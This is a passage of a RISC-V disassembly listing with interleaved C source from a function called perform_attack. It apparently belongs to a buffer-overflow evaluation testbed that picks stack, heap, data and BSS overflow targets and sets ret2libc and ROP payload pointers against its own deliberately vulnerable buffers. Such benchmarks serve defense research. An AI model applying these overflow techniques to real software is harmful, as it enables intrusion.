            if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
80042b34:	800477b7          	lui	a5,0x80047
80042b38:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042b3c:	4798                	lw	a4,8(a5)
80042b3e:	13a00793          	li	a5,314
80042b42:	04f70463          	beq	a4,a5,80042b8a <perform_attack+0x344>
            buffer = bss_buffer;
80042b46:	800477b7          	lui	a5,0x80047
80042b4a:	f1478793          	addi	a5,a5,-236 # 80046f14 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f15>
80042b4e:	96f42c23          	sw	a5,-1672(s0)
            bss_flag = 0;
80042b52:	800477b7          	lui	a5,0x80047
80042b56:	da07a023          	sw	zero,-608(a5) # 80046da0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da1>
            bss_mem_ptr_aux = &dummy_function;
80042b5a:	800427b7          	lui	a5,0x80042
80042b5e:	2c678793          	addi	a5,a5,710 # 800422c6 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422c7>
80042b62:	80047737          	lui	a4,0x80047
80042b66:	daf72623          	sw	a5,-596(a4) # 80046dac <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dad>
            bss_mem_ptr     = &dummy_function;
80042b6a:	80047737          	lui	a4,0x80047
80042b6e:	daf72423          	sw	a5,-600(a4) # 80046da8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da9>
            if (attack.inject_param == DATA_ONLY) {
80042b72:	800477b7          	lui	a5,0x80047
80042b76:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042b7a:	43d8                	lw	a4,4(a5)
80042b7c:	0cb00793          	li	a5,203
80042b80:	00f70c63          	beq	a4,a5,80042b98 <perform_attack+0x352>
            heap_func_ptr = (void *) heap_buffer1;
80042b84:	92942a23          	sw	s1,-1740(s0)
80042b88:	bd2d                	j	800429c2 <perform_attack+0x17c>
                buffer = bss_struct.buffer;
80042b8a:	800477b7          	lui	a5,0x80047
80042b8e:	03478793          	addi	a5,a5,52 # 80047034 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047035>
80042b92:	96f42c23          	sw	a5,-1672(s0)
                break;
80042b96:	b535                	j	800429c2 <perform_attack+0x17c>
                bss_mem_ptr = &bss_flag;
80042b98:	80047737          	lui	a4,0x80047
80042b9c:	800477b7          	lui	a5,0x80047
80042ba0:	da078793          	addi	a5,a5,-608 # 80046da0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da1>
80042ba4:	daf72423          	sw	a5,-600(a4) # 80046da8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da9>
            heap_func_ptr = (void *) heap_buffer1;
80042ba8:	92942a23          	sw	s1,-1740(s0)
80042bac:	bd19                	j	800429c2 <perform_attack+0x17c>
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
80042bae:	92a42423          	sw	a0,-1752(s0)
                heap_mem_ptr = heap_flag;
80042bb2:	93342023          	sw	s3,-1760(s0)
80042bb6:	b531                	j	800429c2 <perform_attack+0x17c>
            switch (attack.code_ptr) {
80042bb8:	800477b7          	lui	a5,0x80047
80042bbc:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042bc0:	479c                	lw	a5,8(a5)
80042bc2:	ed478793          	addi	a5,a5,-300
80042bc6:	4745                	li	a4,17
80042bc8:	e2f761e3          	bltu	a4,a5,800429ea <perform_attack+0x1a4>
80042bcc:	078a                	slli	a5,a5,0x2
80042bce:	80045737          	lui	a4,0x80045
80042bd2:	3ec70713          	addi	a4,a4,1004 # 800453ec <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800453ed>
80042bd6:	97ba                	add	a5,a5,a4
80042bd8:	439c                	lw	a5,0(a5)
80042bda:	8782                	jr	a5
                    target_addr = RET_ADDR_PTR;
80042bdc:	ffc40793          	addi	a5,s0,-4
80042be0:	92f42823          	sw	a5,-1744(s0)
                    break;
80042be4:	b519                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &stack_func_ptr_param;
80042be6:	93c40793          	addi	a5,s0,-1732
80042bea:	92f42823          	sw	a5,-1744(s0)
                    break;
80042bee:	bbf5                	j	800429ea <perform_attack+0x1a4>
                    target_addr = heap_func_ptr;
80042bf0:	93442783          	lw	a5,-1740(s0)
80042bf4:	92f42823          	sw	a5,-1744(s0)
                    break;
80042bf8:	bbcd                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &bss_func_ptr;
80042bfa:	800477b7          	lui	a5,0x80047
80042bfe:	da478793          	addi	a5,a5,-604 # 80046da4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da5>
80042c02:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c06:	b3d5                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &data_func_ptr;
80042c08:	800477b7          	lui	a5,0x80047
80042c0c:	d1878793          	addi	a5,a5,-744 # 80046d18 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d19>
80042c10:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c14:	bbd9                	j	800429ea <perform_attack+0x1a4>
                    target_addr = stack_jmp_buffer;
80042c16:	eb040793          	addi	a5,s0,-336
80042c1a:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c1e:	b3f1                	j	800429ea <perform_attack+0x1a4>
                    target_addr = stack_jmp_buffer_param;
80042c20:	93842783          	lw	a5,-1736(s0)
80042c24:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c28:	b3c9                	j	800429ea <perform_attack+0x1a4>
                    target_addr = (void *) heap_jmp_buffer;
80042c2a:	92842783          	lw	a5,-1752(s0)
80042c2e:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c32:	bb65                	j	800429ea <perform_attack+0x1a4>
                    target_addr = data_jmp_buffer;
80042c34:	800467b7          	lui	a5,0x80046
80042c38:	77878793          	addi	a5,a5,1912 # 80046778 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046779>
80042c3c:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c40:	b36d                	j	800429ea <perform_attack+0x1a4>
                    target_addr = bss_jmp_buffer;
80042c42:	800477b7          	lui	a5,0x80047
80042c46:	dd078793          	addi	a5,a5,-560 # 80046dd0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dd1>
80042c4a:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c4e:	bb71                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &stack_struct.func_ptr;
80042c50:	a7c40793          	addi	a5,s0,-1412
80042c54:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c58:	bb49                	j	800429ea <perform_attack+0x1a4>
                    target_addr = (void *) heap_struct + 256;
80042c5a:	92c42783          	lw	a5,-1748(s0)
80042c5e:	10078793          	addi	a5,a5,256
80042c62:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c66:	b351                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &data_struct.func_ptr;
80042c68:	800477b7          	lui	a5,0x80047
80042c6c:	c0878793          	addi	a5,a5,-1016 # 80046c08 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046c09>
80042c70:	10078793          	addi	a5,a5,256
80042c74:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c78:	bb8d                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &bss_struct.func_ptr;
80042c7a:	800477b7          	lui	a5,0x80047
80042c7e:	03478793          	addi	a5,a5,52 # 80047034 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047035>
80042c82:	10078793          	addi	a5,a5,256
80042c86:	92f42823          	sw	a5,-1744(s0)
                    break;
80042c8a:	b385                	j	800429ea <perform_attack+0x1a4>
                    switch (attack.location) {
80042c8c:	800477b7          	lui	a5,0x80047
80042c90:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042c94:	47dc                	lw	a5,12(a5)
80042c96:	19100713          	li	a4,401
80042c9a:	0ee78a63          	beq	a5,a4,80042d8e <perform_attack+0x548>
80042c9e:	02f77163          	bgeu	a4,a5,80042cc0 <perform_attack+0x47a>
80042ca2:	19200713          	li	a4,402
80042ca6:	0ee78763          	beq	a5,a4,80042d94 <perform_attack+0x54e>
80042caa:	19300713          	li	a4,403
80042cae:	d2e79ee3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                            target_addr = &data_flag;
80042cb2:	800477b7          	lui	a5,0x80047
80042cb6:	d1478793          	addi	a5,a5,-748 # 80046d14 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d15>
80042cba:	92f42823          	sw	a5,-1744(s0)
80042cbe:	b335                	j	800429ea <perform_attack+0x1a4>
80042cc0:	19000713          	li	a4,400
80042cc4:	d2e793e3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                            target_addr = &stack_flag;
80042cc8:	ea040793          	addi	a5,s0,-352
80042ccc:	92f42823          	sw	a5,-1744(s0)
80042cd0:	bb29                	j	800429ea <perform_attack+0x1a4>
                    switch (attack.location) {
80042cd2:	800477b7          	lui	a5,0x80047
80042cd6:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042cda:	47dc                	lw	a5,12(a5)
80042cdc:	19100713          	li	a4,401
80042ce0:	0ce78163          	beq	a5,a4,80042da2 <perform_attack+0x55c>
80042ce4:	02f77163          	bgeu	a4,a5,80042d06 <perform_attack+0x4c0>
80042ce8:	19200713          	li	a4,402
80042cec:	0ae78e63          	beq	a5,a4,80042da8 <perform_attack+0x562>
80042cf0:	19300713          	li	a4,403
80042cf4:	cee79be3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                            target_addr = &data_secret;
80042cf8:	800477b7          	lui	a5,0x80047
80042cfc:	be878793          	addi	a5,a5,-1048 # 80046be8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046be9>
80042d00:	92f42823          	sw	a5,-1744(s0)
80042d04:	b1dd                	j	800429ea <perform_attack+0x1a4>
80042d06:	19000713          	li	a4,400
80042d0a:	cee790e3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                            target_addr = &stack_secret;
80042d0e:	e8040793          	addi	a5,s0,-384
80042d12:	92f42823          	sw	a5,-1744(s0)
80042d16:	b9d1                	j	800429ea <perform_attack+0x1a4>
            switch (attack.location) {
80042d18:	800477b7          	lui	a5,0x80047
80042d1c:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042d20:	47dc                	lw	a5,12(a5)
80042d22:	19100713          	li	a4,401
80042d26:	04e78663          	beq	a5,a4,80042d72 <perform_attack+0x52c>
80042d2a:	02f77763          	bgeu	a4,a5,80042d58 <perform_attack+0x512>
80042d2e:	19200713          	li	a4,402
80042d32:	08e78263          	beq	a5,a4,80042db6 <perform_attack+0x570>
80042d36:	19300713          	li	a4,403
80042d3a:	cae798e3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                    target_addr_aux = &data_mem_ptr_aux;
80042d3e:	800477b7          	lui	a5,0x80047
80042d42:	ae878793          	addi	a5,a5,-1304 # 80046ae8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046ae9>
80042d46:	92f42223          	sw	a5,-1756(s0)
                    target_addr     = &data_mem_ptr;
80042d4a:	800477b7          	lui	a5,0x80047
80042d4e:	9e878793          	addi	a5,a5,-1560 # 800469e8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800469e9>
80042d52:	92f42823          	sw	a5,-1744(s0)
80042d56:	b951                	j	800429ea <perform_attack+0x1a4>
80042d58:	19000713          	li	a4,400
80042d5c:	c8e797e3          	bne	a5,a4,800429ea <perform_attack+0x1a4>
                    target_addr_aux = &stack_mem_ptr_aux;
80042d60:	ea440793          	addi	a5,s0,-348
80042d64:	92f42223          	sw	a5,-1756(s0)
                    target_addr     = &stack_mem_ptr;
80042d68:	ea840793          	addi	a5,s0,-344
80042d6c:	92f42823          	sw	a5,-1744(s0)
80042d70:	b9ad                	j	800429ea <perform_attack+0x1a4>
                    target_addr_aux = heap_mem_ptr_aux;
80042d72:	91c42783          	lw	a5,-1764(s0)
80042d76:	92f42223          	sw	a5,-1756(s0)
                    target_addr     = heap_mem_ptr;
80042d7a:	92042783          	lw	a5,-1760(s0)
80042d7e:	92f42823          	sw	a5,-1744(s0)
                    break;
80042d82:	b1a5                	j	800429ea <perform_attack+0x1a4>
                    target_addr = &stack_func_ptr;
80042d84:	eac40793          	addi	a5,s0,-340
80042d88:	92f42823          	sw	a5,-1744(s0)
80042d8c:	b9b9                	j	800429ea <perform_attack+0x1a4>
                            target_addr = heap_flag;
80042d8e:	93342823          	sw	s3,-1744(s0)
80042d92:	b9a1                	j	800429ea <perform_attack+0x1a4>
                            target_addr = &bss_flag;
80042d94:	800477b7          	lui	a5,0x80047
80042d98:	da078793          	addi	a5,a5,-608 # 80046da0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da1>
80042d9c:	92f42823          	sw	a5,-1744(s0)
80042da0:	b1a9                	j	800429ea <perform_attack+0x1a4>
                            target_addr = heap_secret;
80042da2:	93242823          	sw	s2,-1744(s0)
80042da6:	b191                	j	800429ea <perform_attack+0x1a4>
                            target_addr = &bss_secret;
80042da8:	800477b7          	lui	a5,0x80047
80042dac:	01478793          	addi	a5,a5,20 # 80047014 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047015>
80042db0:	92f42823          	sw	a5,-1744(s0)
80042db4:	b91d                	j	800429ea <perform_attack+0x1a4>
                    target_addr_aux = &bss_mem_ptr_aux;
80042db6:	800477b7          	lui	a5,0x80047
80042dba:	dac78793          	addi	a5,a5,-596 # 80046dac <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dad>
80042dbe:	92f42223          	sw	a5,-1756(s0)
                    target_addr     = &bss_mem_ptr;
80042dc2:	800477b7          	lui	a5,0x80047
80042dc6:	da878793          	addi	a5,a5,-600 # 80046da8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da9>
80042dca:	92f42823          	sw	a5,-1744(s0)
80042dce:	b931                	j	800429ea <perform_attack+0x1a4>
            if (setjmp(stack_jmp_buffer) != 0) {
80042dd0:	eb040513          	addi	a0,s0,-336
80042dd4:	d39fd0ef          	jal	ra,80040b0c <setjmp>
80042dd8:	e511                	bnez	a0,80042de4 <perform_attack+0x59e>
            payload.jmp_buffer = &stack_jmp_buffer;
80042dda:	eb040793          	addi	a5,s0,-336
80042dde:	94f42823          	sw	a5,-1712(s0)
            break;
80042de2:	a00d                	j	80042e04 <perform_attack+0x5be>
                printf("Longjmp attack failed. Returning normally...\n");
80042de4:	80046537          	lui	a0,0x80046
80042de8:	ae050513          	addi	a0,a0,-1312 # 80045ae0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ae1>
80042dec:	2b0010ef          	jal	ra,8004409c <printk>
80042df0:	a9dd                	j	800432e6 <perform_attack+0xaa0>
            if (setjmp(stack_jmp_buffer_param) != 0) {
80042df2:	93842503          	lw	a0,-1736(s0)
80042df6:	d17fd0ef          	jal	ra,80040b0c <setjmp>
80042dfa:	e54d                	bnez	a0,80042ea4 <perform_attack+0x65e>
            payload.jmp_buffer = &stack_jmp_buffer_param;
80042dfc:	93840793          	addi	a5,s0,-1736
80042e00:	94f42823          	sw	a5,-1712(s0)
    payload.ptr_to_correct_return_addr = RET_ADDR_PTR;
80042e04:	ffc40793          	addi	a5,s0,-4
80042e08:	96f42223          	sw	a5,-1692(s0)
    payload.inject_param = attack.inject_param;
80042e0c:	800477b7          	lui	a5,0x80047
80042e10:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042e14:	43d8                	lw	a4,4(a5)
80042e16:	94e42023          	sw	a4,-1728(s0)
    switch (attack.technique) {
80042e1a:	439c                	lw	a5,0(a5)
80042e1c:	06400693          	li	a3,100
80042e20:	10d78a63          	beq	a5,a3,80042f34 <perform_attack+0x6ee>
80042e24:	06500713          	li	a4,101
80042e28:	16e78c63          	beq	a5,a4,80042fa0 <perform_attack+0x75a>
        fprintf(stderr, "target_addr == %p\n", target_addr);
80042e2c:	93042483          	lw	s1,-1744(s0)
80042e30:	85a6                	mv	a1,s1
80042e32:	80046537          	lui	a0,0x80046
80042e36:	b5850513          	addi	a0,a0,-1192 # 80045b58 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b59>
80042e3a:	262010ef          	jal	ra,8004409c <printk>
        fprintf(stderr, "buffer == %p\n", buffer);
80042e3e:	97842583          	lw	a1,-1672(s0)
80042e42:	80046537          	lui	a0,0x80046
80042e46:	b6c50513          	addi	a0,a0,-1172 # 80045b6c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b6d>
80042e4a:	252010ef          	jal	ra,8004409c <printk>
    if ((unsigned long) target_addr > (unsigned long) buffer) {
80042e4e:	97842583          	lw	a1,-1672(s0)
80042e52:	2495f663          	bgeu	a1,s1,8004309e <perform_attack+0x858>
          - (unsigned long) buffer
80042e56:	40b485b3          	sub	a1,s1,a1
          + 1); /* For null termination so that buffer can be     */
80042e5a:	0595                	addi	a1,a1,5
        payload.size =
80042e5c:	94b42223          	sw	a1,-1724(s0)
            fprintf(stderr, "payload size == %d\n", payload.size);
80042e60:	80046537          	lui	a0,0x80046
80042e64:	b7c50513          	addi	a0,a0,-1156 # 80045b7c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b7d>
80042e68:	234010ef          	jal	ra,8004409c <printk>
    buffer[0] = '\0';
80042e6c:	97842783          	lw	a5,-1672(s0)
80042e70:	00078023          	sb	zero,0(a5)
    if (!build_payload(&payload)) {
80042e74:	94040513          	addi	a0,s0,-1728
80042e78:	cf0ff0ef          	jal	ra,80042368 <build_payload>
80042e7c:	22050a63          	beqz	a0,800430b0 <perform_attack+0x86a>
    switch (attack.function) {
80042e80:	800477b7          	lui	a5,0x80047
80042e84:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042e88:	4b9c                	lw	a5,16(a5)
80042e8a:	e0c78793          	addi	a5,a5,-500
80042e8e:	4721                	li	a4,8
80042e90:	34f76c63          	bltu	a4,a5,800431e8 <perform_attack+0x9a2>
80042e94:	078a                	slli	a5,a5,0x2
80042e96:	80045737          	lui	a4,0x80045
80042e9a:	43470713          	addi	a4,a4,1076 # 80045434 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045435>
80042e9e:	97ba                	add	a5,a5,a4
80042ea0:	439c                	lw	a5,0(a5)
80042ea2:	8782                	jr	a5
                printf("Longjmp attack failed. Returning normally...\n");
80042ea4:	80046537          	lui	a0,0x80046
80042ea8:	ae050513          	addi	a0,a0,-1312 # 80045ae0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ae1>
80042eac:	1f0010ef          	jal	ra,8004409c <printk>
80042eb0:	b7b1                	j	80042dfc <perform_attack+0x5b6>
            if (setjmp(*heap_jmp_buffer) != 0) {
80042eb2:	92842503          	lw	a0,-1752(s0)
80042eb6:	c57fd0ef          	jal	ra,80040b0c <setjmp>
80042eba:	e901                	bnez	a0,80042eca <perform_attack+0x684>
            payload.jmp_buffer = (void *) heap_jmp_buffer;
80042ebc:	92842783          	lw	a5,-1752(s0)
80042ec0:	94f42823          	sw	a5,-1712(s0)
            payload.stack_jmp_buffer_param = NULL;
80042ec4:	94042a23          	sw	zero,-1708(s0)
            break;
80042ec8:	bf35                	j	80042e04 <perform_attack+0x5be>
                printf("Longjmp attack failed. Returning normally...\n");
80042eca:	80046537          	lui	a0,0x80046
80042ece:	ae050513          	addi	a0,a0,-1312 # 80045ae0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ae1>
80042ed2:	1ca010ef          	jal	ra,8004409c <printk>
80042ed6:	a901                	j	800432e6 <perform_attack+0xaa0>
            if (setjmp(data_jmp_buffer) != 0) {
80042ed8:	80046537          	lui	a0,0x80046
80042edc:	77850513          	addi	a0,a0,1912 # 80046778 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046779>
80042ee0:	c2dfd0ef          	jal	ra,80040b0c <setjmp>
80042ee4:	e911                	bnez	a0,80042ef8 <perform_attack+0x6b2>
            payload.jmp_buffer = (void *) data_jmp_buffer;
80042ee6:	800467b7          	lui	a5,0x80046
80042eea:	77878793          	addi	a5,a5,1912 # 80046778 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046779>
80042eee:	94f42823          	sw	a5,-1712(s0)
            payload.stack_jmp_buffer_param = NULL;
80042ef2:	94042a23          	sw	zero,-1708(s0)
            break;
80042ef6:	b739                	j	80042e04 <perform_attack+0x5be>
                printf("Longjmp attack failed. Returning normally...\n");
80042ef8:	80046537          	lui	a0,0x80046
80042efc:	ae050513          	addi	a0,a0,-1312 # 80045ae0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ae1>
80042f00:	19c010ef          	jal	ra,8004409c <printk>
80042f04:	a6cd                	j	800432e6 <perform_attack+0xaa0>
            if (setjmp(bss_jmp_buffer) != 0) {
80042f06:	80047537          	lui	a0,0x80047
80042f0a:	dd050513          	addi	a0,a0,-560 # 80046dd0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dd1>
80042f0e:	bfffd0ef          	jal	ra,80040b0c <setjmp>
80042f12:	e911                	bnez	a0,80042f26 <perform_attack+0x6e0>
            payload.jmp_buffer = (void *) bss_jmp_buffer;
80042f14:	800477b7          	lui	a5,0x80047
80042f18:	dd078793          	addi	a5,a5,-560 # 80046dd0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dd1>
80042f1c:	94f42823          	sw	a5,-1712(s0)
            payload.stack_jmp_buffer_param = NULL;
80042f20:	94042a23          	sw	zero,-1708(s0)
            break;
80042f24:	b5c5                	j	80042e04 <perform_attack+0x5be>
                printf("Longjmp attack failed. Returning normally...\n");
80042f26:	80046537          	lui	a0,0x80046
80042f2a:	ae050513          	addi	a0,a0,-1312 # 80045ae0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ae1>
80042f2e:	16e010ef          	jal	ra,8004409c <printk>
80042f32:	ae55                	j	800432e6 <perform_attack+0xaa0>
            switch (attack.inject_param) {
80042f34:	0c900793          	li	a5,201
80042f38:	02f70c63          	beq	a4,a5,80042f70 <perform_attack+0x72a>
80042f3c:	02e7f163          	bgeu	a5,a4,80042f5e <perform_attack+0x718>
80042f40:	0ca00793          	li	a5,202
80042f44:	02f70d63          	beq	a4,a5,80042f7e <perform_attack+0x738>
80042f48:	0cb00793          	li	a5,203
80042f4c:	04f71163          	bne	a4,a5,80042f8e <perform_attack+0x748>
                    payload.overflow_ptr = 0xdeadbeef;
80042f50:	deadc7b7          	lui	a5,0xdeadc
80042f54:	eef78793          	addi	a5,a5,-273 # deadbeef <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0xdeadbef0>
80042f58:	94f42423          	sw	a5,-1720(s0)
                    break;
80042f5c:	bdc1                	j	80042e2c <perform_attack+0x5e6>
80042f5e:	0c800793          	li	a5,200
80042f62:	02f71663          	bne	a4,a5,80042f8e <perform_attack+0x748>
                    payload.overflow_ptr = buffer;
80042f66:	97842783          	lw	a5,-1672(s0)
80042f6a:	94f42423          	sw	a5,-1720(s0)
                    break;
80042f6e:	bd7d                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &ret2libc_target;
80042f70:	800427b7          	lui	a5,0x80042
80042f74:	2f478793          	addi	a5,a5,756 # 800422f4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422f5>
80042f78:	94f42423          	sw	a5,-1720(s0)
                    break;
80042f7c:	bd45                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = (uintptr_t) &rop_target + 16;
80042f7e:	800427b7          	lui	a5,0x80042
80042f82:	30a78793          	addi	a5,a5,778 # 8004230a <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004230b>
80042f86:	07c1                	addi	a5,a5,16
80042f88:	94f42423          	sw	a5,-1720(s0)
                    break;
80042f8c:	b545                	j	80042e2c <perform_attack+0x5e6>
                        fprintf(stderr, "Unknown choice of attack code");
80042f8e:	80046537          	lui	a0,0x80046
80042f92:	b1050513          	addi	a0,a0,-1264 # 80045b10 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b11>
80042f96:	106010ef          	jal	ra,8004409c <printk>
                        exit(1);
80042f9a:	4505                	li	a0,1
80042f9c:	eb0fd0ef          	jal	ra,8004064c <exit>
            switch (attack.code_ptr) {
80042fa0:	800477b7          	lui	a5,0x80047
80042fa4:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042fa8:	479c                	lw	a5,8(a5)
80042faa:	ed478793          	addi	a5,a5,-300
80042fae:	4745                	li	a4,17
80042fb0:	0cf76e63          	bltu	a4,a5,8004308c <perform_attack+0x846>
80042fb4:	078a                	slli	a5,a5,0x2
80042fb6:	80045737          	lui	a4,0x80045
80042fba:	45870713          	addi	a4,a4,1112 # 80045458 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045459>
80042fbe:	97ba                	add	a5,a5,a4
80042fc0:	439c                	lw	a5,0(a5)
80042fc2:	8782                	jr	a5
                    payload.overflow_ptr = RET_ADDR_PTR;
80042fc4:	ffc40793          	addi	a5,s0,-4
80042fc8:	94f42423          	sw	a5,-1720(s0)
                    break;
80042fcc:	b585                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &stack_func_ptr;
80042fce:	eac40793          	addi	a5,s0,-340
80042fd2:	94f42423          	sw	a5,-1720(s0)
                    break;
80042fd6:	bd99                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &stack_func_ptr_param;
80042fd8:	93c40793          	addi	a5,s0,-1732
80042fdc:	94f42423          	sw	a5,-1720(s0)
                    break;
80042fe0:	b5b1                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = heap_func_ptr;
80042fe2:	93442783          	lw	a5,-1740(s0)
80042fe6:	94f42423          	sw	a5,-1720(s0)
                    break;
80042fea:	b589                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &bss_func_ptr;
80042fec:	800477b7          	lui	a5,0x80047
80042ff0:	da478793          	addi	a5,a5,-604 # 80046da4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da5>
80042ff4:	94f42423          	sw	a5,-1720(s0)
                    break;
80042ff8:	bd15                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &data_func_ptr;
80042ffa:	800477b7          	lui	a5,0x80047
80042ffe:	d1878793          	addi	a5,a5,-744 # 80046d18 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d19>
80043002:	94f42423          	sw	a5,-1720(s0)
                    break;
80043006:	b51d                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &stack_struct.func_ptr;
80043008:	a7c40793          	addi	a5,s0,-1412
8004300c:	94f42423          	sw	a5,-1720(s0)
                    break;
80043010:	bd31                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = (void *) heap_struct + 256;
80043012:	92c42783          	lw	a5,-1748(s0)
80043016:	10078793          	addi	a5,a5,256
8004301a:	94f42423          	sw	a5,-1720(s0)
                    break;
8004301e:	b539                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &data_struct.func_ptr;
80043020:	800477b7          	lui	a5,0x80047
80043024:	c0878793          	addi	a5,a5,-1016 # 80046c08 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046c09>
80043028:	10078793          	addi	a5,a5,256
8004302c:	94f42423          	sw	a5,-1720(s0)
                    break;
80043030:	bbf5                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &bss_struct.func_ptr;
80043032:	800477b7          	lui	a5,0x80047
80043036:	03478793          	addi	a5,a5,52 # 80047034 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047035>
8004303a:	10078793          	addi	a5,a5,256
8004303e:	94f42423          	sw	a5,-1720(s0)
                    break;
80043042:	b3ed                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = stack_jmp_buffer;
80043044:	eb040793          	addi	a5,s0,-336
80043048:	94f42423          	sw	a5,-1720(s0)
                    break;
8004304c:	b3c5                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = stack_jmp_buffer_param;
8004304e:	93842783          	lw	a5,-1736(s0)
80043052:	94f42423          	sw	a5,-1720(s0)
                    break;
80043056:	bbd9                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = *heap_jmp_buffer;
80043058:	92842783          	lw	a5,-1752(s0)
8004305c:	94f42423          	sw	a5,-1720(s0)
                    break;
80043060:	b3f1                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = data_jmp_buffer;
80043062:	800467b7          	lui	a5,0x80046
80043066:	77878793          	addi	a5,a5,1912 # 80046778 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046779>
